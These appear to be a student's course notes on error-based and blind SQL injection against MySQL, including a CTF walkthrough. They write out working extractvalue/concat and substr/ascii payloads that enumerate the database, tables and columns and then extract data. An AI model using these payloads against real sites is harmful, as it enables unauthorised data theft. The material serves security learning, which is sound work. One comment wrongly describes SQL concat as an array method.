# UNion SQL Injection
#  1. Rule? = column number (order by / union select null, null .... #)
#  2. it can make select use again
#  3. https://brightsec.com/blog/union-sql-injection/

# Other SQL Injections
# Error Based SQL Injection
# an in-band SQL Injection technique that relies on error messages thrown by the database server to obtain information about the structure of the database.
# Blind SQL Injection
# a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the applications response.

# Python Basic Logic

------------------------------------------------------------------------------------------------------------------------------------

# Part 1. Error based SQL Injection
#   - Data output by using error messages
# 1. Syntax Error in Logic Error
#  ex) select * from member where id='
#  - Syntax error is not working for SQL Injection

# 2. Logic Error (Error Based SQL Injection)
#  - By using error messages, input the SQL Injection and make it output
#  - We want output on the error message
#  - XPATH syntax error = a syntax or language that makes finding elements on a webpage possible using XML path expression
#  Logic error tip to create errors
#    - It is different from databases such as MySQL, oracle, mssql
#    - extractvalue('xml text','xml expression')     = The EXTRACTVALUE function takes as arguments an XMLType instance and an XPath expression and returns a scalar value of the resultant node.
#    ex) normaltic' and extractvalue('1', ':normaltic') and '1'='1
#    ex) normaltic' and extractvalue('1', concat(0x3a,(select'normaltic'))) and'1'='1
#    concat('1','2') => 12      = The concat() method of Array instances is used to merge two or more arrays.
#    concat(0x3a, 'test') => :test
#    concat(0x3a, (select 'normaltic'))

------------------------------------------------------------------------------------------------------------------------------------

# Part 2. Error based SQL Injection Process
#  1. Find SQL Point
#    ex) normaltic'
#  2. Output function of error
#    extractvalue
#  3. Create attack format
#    normaltic' and extractvalue('1', concat(0x3a,(_______________))) and '1'='1
#  4. Output of DB name
#    select database()
#    ex) normaltic' and extractvalue('1', concat(0x3a,(select database()))) and '1'='1
#  5. Table name
#    limit(column_number, row_number)
#    select table_name from information_schema.tables where table_schema = 'database_name' limit 0,1
#    select table_name from information_schema.tables where table_schema = 'database_name' limit 1,1
#    select table_name from information_schema.tables where table_schema = 'database_name' limit 2,1
#    normaltic' and extractvalue('1', concat(0x3a,(select table_name from information_schema.tables where table_schema = 'database_name' limit 0,1))) and '1'='1
#  6. Column name
#    select column_name from information_schema.columns where table_name = 'table_name' limit 0,1
#    normaltic' and extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name = 'table_name' limit 0,1))) and '1'='1
#  7. Data output
#    select name from game limit 0,1
#    normaltic' and extractvalue('1', concat(0x3a,(select name from game limit 0,1))) and '1'='1

# CTF - SQL Injection (Error Based SQLi Basic)
#  1. Find SQL Point
#  2. Output function of error
#  3. Create attack format
#  4. Output of DB name: errSqli
#    normaltic' and extractvalue('1', concat(0x3a,(select database()))) and '1'='1
#  5. Table name: flagTable
#    normaltic' and extractvalue('1', concat(0x3a,(select table_name from information_schema.tables where table_schema = 'errSqli' limit 0,1))) and '1'='1
#  6. Column name: flag
#    normaltic' and extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name = 'flagTable' limit 1,1))) and '1'='1
#  7. Data output
#    normaltic' and extractvalue('1', concat(0x3a,(select flag from flagTable limit 0,1))) and '1'='1

------------------------------------------------------------------------------------------------------------------------------------

# Part 3. Blind-based SQL Injection
#   - Display output of SQL injection result: Union SQL Injection
#   - Display error message: Error-based SQL injection
#   - Not display error message: Blind-based SQL injection
#      1) Log-in page
#      2) ID double check
#      = Response difference between True or False 
#      ex) normaltic' and '1' = '1            => ID exists
#      ex) normaltic' and '1' = '2            => ID doesn't exist
#      ex) normaltic' and ('1' = '1') and '1' = '1

------------------------------------------------------------------------------------------------------------------------------------

# Part 4. Blind-based SQL Injection Process
#  1. Find SQL Injection Point
#    normaltic' and '1'='1      => True
#    normaltic' and '1'='2      => False
#  2. Check select function
#    normaltic' and ((select'test')='test')) and '1'='1
#  3. Attack format
#    normaltic' and (_____________) and '1'='1
#    substr() = The SUBSTR() function extracts a substring from a string (starting at any position)
#    substr('test',1,1) => 't'
#    substr('test',1,2) => 'te'
#    substr('test',2,1) => 'e'
#    substr((___SQL___),1,1)
#    substr((select'test'),1,1)='t'
#    normaltic' and (substr((select'test'),1,1)='t') and '1'='1
#    ascii(substr((___SQL___),1,1)) > 0
#    normaltic' and (ascii(substr((select'test'),1,1)) > 0) and '1'='1     = Attack format
#    When operating the attack format, it executes the repeater in Burp suite
#  4. Find database
#    normaltic' and (ascii(substr((select database()),1,1)) > 0) and '1'='1     = Attack format
#  5. Find table name
#    select table_name from information_schema.tables where table_schema = 'database_name'
#  6. Find column name
#  7. Find data

------------------------------------------------------------------------------------------------------------------------------------

# Assignment
#  1. Review Error-base SQL Injection
#  2. Review Blind-based SQL Injection
#  3. Review SQL Injection
#  4. SQL Injection - CTF
#  5. Web Site Development
